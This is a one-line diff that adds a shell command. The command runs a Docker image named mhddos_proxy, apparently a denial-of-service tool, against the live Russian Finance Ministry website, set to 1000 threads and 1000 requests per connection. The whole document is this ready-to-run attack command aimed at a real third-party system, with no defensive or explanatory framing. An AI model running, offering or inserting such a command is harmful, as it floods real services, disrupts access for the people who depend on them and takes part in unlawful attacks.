@@ -1,0 +1,1 @@
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://minfin.gov.ru --http-methods GET STRESS -t 1000 -p 1200 --rpc 1000 --debug
